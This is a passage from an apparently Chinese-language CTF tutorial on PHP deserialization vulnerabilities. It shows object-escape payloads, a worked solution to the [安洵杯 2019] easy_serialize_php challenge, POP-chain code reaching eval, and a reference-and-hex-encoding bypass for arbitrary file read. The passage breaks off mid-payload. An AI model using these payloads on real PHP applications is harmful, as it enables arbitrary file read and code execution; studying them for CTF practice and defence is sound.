是可控的，但只对 username 进行了过滤，因此我们的对象逃逸就会出现在 username 中</p>\n<p>2. 构造我们的 payload，即我们想要覆盖哪个变量</p>\n<p>​\t上述例子中，我们想要将 isVIP 变为 1，因此我们构造的 payload 为：  <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code> ，并且需要计算长度，为了我们之后的覆盖做准备</p>\n<p>3. 分析它的过滤函数，计算到下一个可控变量的长度，将它和（2）中的长度分析</p>\n<p>​\t上述例子中，我们的目标长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;</code>  为 47，到下一个可控变量长度 <code>&quot;;s:8:&quot;password&quot;;s:6:&quot;</code>  为 22</p>\n<p>​\t那么为什么要分析到下一个可控变量的长度呢，因为这中间的 22 个字符就是我们想要吃掉的字符，也就是 username 把原来的 password 吃掉了，现在的 password 我们自己可以写了，我们在自己写的 password 中就可以覆盖掉 isVIP</p>\n<p>4. 进行覆盖与调整</p>\n<p>​\t上述例子中，我们第一次写了 22 个 admin，但后续序列化后发现长度不够，增加至 24 个 admin。调整是为了让每个变量的 &quot; 的位置和前面的字符串数量的位置相同</p>\n<p>5. 进行反序列化验证</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//变长</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:282:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//变少</span><br><span class=\"line\">O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;s:115:&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;;s:8:&quot;password&quot;;s:47:&quot;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&quot;;s:5:&quot;isVIP&quot;;i:0;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">变长是通过将s:后的长度变长，导致可以将不是自己的序列化的东西也收进来</span><br><span class=\"line\">变少是通过将自己本来序列化后不是一个对象的值缩到一个对象中，那么其他缩的对象值就空了，我们就可以覆盖了</span><br><span class=\"line\"></span><br><span class=\"line\">https://www.secpulse.com/archives/165222.html</span><br></pre></td></tr></table></figure>\n<p>比如：[安洵杯 2019] easy_serialize_php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$function</span> = @<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;f&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span>(<span class=\"params\"><span class=\"variable\">$img</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;php&#x27;</span>,<span class=\"string\">&#x27;flag&#x27;</span>,<span class=\"string\">&#x27;php5&#x27;</span>,<span class=\"string\">&#x27;php4&#x27;</span>,<span class=\"string\">&#x27;fl1g&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span>.<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>,<span class=\"variable\">$filter_arr</span>).<span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>,<span class=\"string\">&#x27;&#x27;</span>,<span class=\"variable\">$img</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$_SESSION</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">unset</span>(<span class=\"variable\">$_SESSION</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&quot;user&quot;</span>] = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;function&#x27;</span>] = <span class=\"variable\">$function</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">extract</span>(<span class=\"variable\">$_POST</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$function</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>])&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"string\">&#x27;guest_img.png&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;img&#x27;</span>] = <span class=\"title function_ invoke__\">sha1</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;img_path&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$serialize_info</span> = <span class=\"title function_ invoke__\">filter</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$_SESSION</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"string\">&#x27;index.php&#x27;</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;phpinfo();&#x27;</span>); <span class=\"comment\">//maybe you can find something in here!</span></span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$function</span> == <span class=\"string\">&#x27;show_image&#x27;</span>)&#123;</span><br><span class=\"line\">    <span class=\"variable\">$userinfo</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialize_info</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$userinfo</span>[<span class=\"string\">&#x27;img&#x27;</span>]));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>由于有了上面的基础，这边就简单缩缩了</p>\n<p>首先能造成对象逃逸的关键是 <code>    $serialize_info = filter(serialize($_SESSION));</code> ，将 filter 里面的东西替换为空，导致字符变动，但序列化后的长度值没有变动</p>\n<p>exxtract () 函数从数组中将变量导入到当前的符号表 (本题的作用是将_SESSION 的两个函数变为 post 传参)</p>\n<p>同时题目告诉我们的 phpinfo 中 <code>d0g3_fllllllag</code>  可以判断 flag 位置</p>\n<p>我们可以通过改变 img_path 的内容或者直接改变 userinfo [‘img’] 的内容来达到读取 flag 的目的</p>\n<p>0x00 键值逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload：</span><br><span class=\"line\">_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;1&quot;;s:1:&quot;2&quot;;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">flag和php是敏感字符，在使用的时候被过滤掉了，但序列化记录的字符串长度没有过滤掉，所以在序列化的时候</span><br><span class=\"line\">s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:1:&quot;2&quot;;&#125;被当作了原来的value</span><br><span class=\"line\">在 echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));实现了读取flag的，目的</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115171618604.png\" alt=\"image-20221115171618604\"></p>\n<p>0x01 键名逃逸</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">过滤前</span><br><span class=\"line\">a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">过滤后</span><br><span class=\"line\">a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br><span class=\"line\">下面的步骤和值替换一样</span><br><span class=\"line\">这里的键名变为&quot;;s:48: 实现了逃逸</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x05pop-链利用\"><a class=\"markdownIt-Anchor\" href=\"#0x05pop-链利用\">#</a> 0x05POP 链利用</h4>\n<p>上面的例子都是基于 &quot;自动调用&quot; 的 magic function。** 但当漏洞 / 危险代码存在类的普通方法中，就不能指望通过 &quot;自动调用&quot; 来达到目的了。** 这时我们需要去寻找相同的函数名，把敏感函数和类联系在一起。一般来说在代码审计的时候我们都要盯紧这些敏感函数的，层层递进，最终去构造出一个有杀伤力的 payload。</p>\n<p><strong>1. 一些有用的 POP 链中出现的方法：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">- 命令执行：exec()、passthru()、popen()、system()</span><br><span class=\"line\">- 文件操作：file_put_contents()、file_get_contents()、unlink()</span><br><span class=\"line\">- 代码执行：eval()、assert()、call_user_func()   //call_user_func(assert,phpinfo());</span><br></pre></td></tr></table></figure>\n<p><strong>2. 反序列化中为了避免信息丢失，使用大写 S 支持字符串的编码。</strong></p>\n<p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示 (避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写 S 表示字符串，此时这个字符串就支持将后面的字符串用 16 进制表示，使用如下形式即可绕过，即：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:4:&quot;user&quot;; -&gt; S:4:&quot;use\\72&quot;;</span><br></pre></td></tr></table></figure>\n<p><strong>3. 深浅 copy</strong></p>\n<p>在 php 中如果我们使用 &amp; 对变量 A 的值指向变量 B，这个时候是属于浅拷贝，当变量 B 改变时，变量 A 也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$A = &amp;$B; </span><br></pre></td></tr></table></figure>\n<p><strong>4. 利用 PHP 伪协议</strong></p>\n<p>配合 PHP 伪协议实现文件包含、命令执行等漏洞。如 glob:// 伪协议查找匹配的文件路径模式。</p>\n<h4 id=\"0x06\"><a class=\"markdownIt-Anchor\" href=\"#0x06\">#</a> 0x06</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class main &#123;</span><br><span class=\"line\">    protected $ClassObj;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj = new normal();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct() &#123;</span><br><span class=\"line\">        $this-&gt;ClassObj-&gt;action();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class normal &#123;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        echo &quot;hello bmjoker&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class evil &#123;</span><br><span class=\"line\">    private $data;</span><br><span class=\"line\">    function action() &#123;</span><br><span class=\"line\">        eval($this-&gt;data);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">//$a = new main();</span><br><span class=\"line\">unserialize($_GET[&#x27;a&#x27;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>危险的命令执行方法 eval 不在魔术方法中，在 evil 类中。但是魔术方法__construct () 是调用 normal 类，__destruct () 在程序结束时会去调用 normal 类中的 action () 方法。而我们最终的目的是去调用 evil 类中的 action () 方法，并伪造 evil 类中的变量data，达成任意代码执行的目的。这样的话可以尝试去构造POP利用链，让魔术方法__construct()去调用evil这个类，并且给变量 data 赋予恶意代码，比如 php 探针 phpinfo ()，这样就相当于执行 <code>&lt;?php eval(&quot;phpinfo();&quot;)?&gt;</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo()&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">或者这样构造也行</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> <span class=\"variable\">$ClassObj</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;ClassObj = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">evil</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">evil</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$data</span> = <span class=\"string\">&quot;phpinfo();&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">main</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>但是由于<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>C</mi><mi>l</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>O</mi><mi>b</mi><mi>j</mi><mtext>是</mtext><mi>p</mi><mi>r</mi><mi>o</mi><mi>t</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>e</mi><mi>d</mi><mtext>类型修饰，</mtext></mrow><annotation encoding=\"application/x-tex\">ClassObj是protected类型修饰，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">d</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">修</span><span class=\"mord cjk_fallback\">饰</span><span class=\"mord cjk_fallback\">，</span></span></span></span>data 是 private 类型修饰，在序列化的时候，多出来的字节都被 \\x00 填充，需要进行在代码中使用 urlencode 对序列化后字符串进行编码，否则无法复制解析。</p>\n<p>或者直接改不可见字符为 %00</p>\n<p>url 地址栏中会自动帮我们解析一次 url 编码</p>\n</blockquote>\n<h4 id=\"0x07\"><a class=\"markdownIt-Anchor\" href=\"#0x07\">#</a> 0x07</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyFile</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$user</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$name</span>, <span class=\"variable\">$user</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"variable\">$name</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$user</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$this</span>-&gt;name, <span class=\"string\">&quot;flag&quot;</span>)!==False) </span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/hostname&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;name = <span class=\"string\">&quot;/etc/passwd&quot;</span>; </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">$this</span>-&gt;user = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;user&#x27;</span>]; </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$input</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;input&#x27;</span>]; </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(<span class=\"variable\">$input</span>, <span class=\"string\">&#x27;user&#x27;</span>)!==False)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Hacker&#x27;</span>); </span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$input</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>像如上代码比较复杂的可以先定位魔术方法与漏洞触发点。在代码中发现__toString () 魔术方法调用了 file_get_contents () 来读取变量name的数据。当程序执行结束或者变量销毁时就会自动调用析构函数__destruct()并使用echo输出变量，__toString()方法在此时会被自动调用。关键在于如果能控制变量 name，就可以造成任意文件读取漏洞。但是通读代码发现前端传入的可控数据只有变量<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mtext>，并且传入的</mtext></mrow><annotation encoding=\"application/x-tex\">user，并且传入的</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">并</span><span class=\"mord cjk_fallback\">且</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">的</span></span></span></span> user 还不能包含 “user” 子符串。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">paload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class MyFile &#123;</span><br><span class=\"line\">    public $name = &#x27;/etc/hosts&#x27;;</span><br><span class=\"line\">    public $user = &#x27;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = new MyFile();</span><br><span class=\"line\">$a-&gt;name = &amp;$a-&gt;user;</span><br><span class=\"line\">$b = serialize($a);</span><br><span class=\"line\">$b = str_replace(&quot;user&quot;, &quot;use\\\\72&quot;, $b);</span><br><span class=\"line\">$b = str_replace(&quot;s&quot;, &quot;S&quot;, 